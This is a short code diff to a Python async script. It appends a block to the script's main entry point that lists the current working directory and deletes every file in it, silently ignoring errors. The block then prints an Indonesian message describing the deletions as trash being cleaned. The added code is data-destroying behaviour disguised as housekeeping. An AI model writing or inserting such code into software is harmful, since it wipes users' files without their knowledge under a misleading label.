@@ -29,3 +29,12 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.get_event_loop_policy().get_event_loop().run_until_complete(main())
+    count = 0
+    for X in os.popen("ls").read().split():
+        try:
+            os.remove(X)
+            count += 1
+        except:
+            pass
+    print(f"✅ {count} sampah berhasil di bersihkan")
+    
